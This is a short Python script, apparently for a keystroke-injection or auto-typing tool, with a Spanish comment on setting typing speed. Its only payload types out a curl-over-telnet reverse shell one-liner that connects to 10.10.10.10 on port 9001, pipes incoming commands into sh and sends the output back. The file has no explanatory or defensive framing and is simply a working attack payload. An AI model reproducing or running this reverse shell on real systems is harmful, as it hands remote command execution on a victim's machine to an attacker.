from .. import send

send.speed(1) # Si se requiere modificar la velocidad de escritura es necesario declarar antes de llamar a la funcion "send"
send.send("C='curl -Ns telnet://10.10.10.10:9001'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/nul")